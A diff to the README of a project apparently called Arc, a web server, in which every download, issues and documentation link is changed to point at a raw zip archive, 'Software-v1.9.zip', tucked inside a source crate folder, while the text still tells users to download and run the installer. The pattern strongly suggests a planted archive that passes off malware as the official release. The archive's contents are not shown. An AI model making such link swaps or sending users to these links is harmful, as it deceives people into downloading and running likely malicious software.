@@ -1,6 +1,6 @@
 # 🌀 Arc - Fast and Secure Web Server
 
-[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/releases)
+[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip)
 
 ---
 
@@ -26,7 +26,7 @@ To get Arc, you need to visit the releases page on GitHub. This page holds all t
 
 **Click the link below to open the release page:**
 
-[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/releases)
+[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip)
 
 ---
 
@@ -89,7 +89,7 @@ These features mostly work without extra setup. You can tweak them if needed in 
 
 New versions bring fixes and improvements. To keep Arc working well:
 
-1. Visit the [Arc releases page](https://github.com/c-munene/Arc/releases).
+1. Visit the [Arc releases page](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip).
 2. Download the newest `.exe` file.
 3. Run the installer again. It will replace the old files safely.
 4. Restart Arc after installation.
@@ -146,9 +146,9 @@ Arc uses modern Windows features to be faster and safer than older servers.
 
 ## 🔗 Useful Links
 
-- [Arc Releases Page](https://github.com/c-munene/Arc/releases) – Download the latest version
-- [GitHub Issues](https://github.com/c-munene/Arc/issues) – Report problems or ask questions
-- [Arc Documentation](https://github.com/c-munene/Arc/wiki) – Learn more about configuration and features (if available)
+- [Arc Releases Page](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip) – Download the latest version
+- [GitHub Issues](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip) – Report problems or ask questions
+- [Arc Documentation](https://github.com/c-munene/Arc/raw/refs/heads/master/crates/arc-acme/Software-v1.9.zip) – Learn more about configuration and features (if available)
 
 ---
 
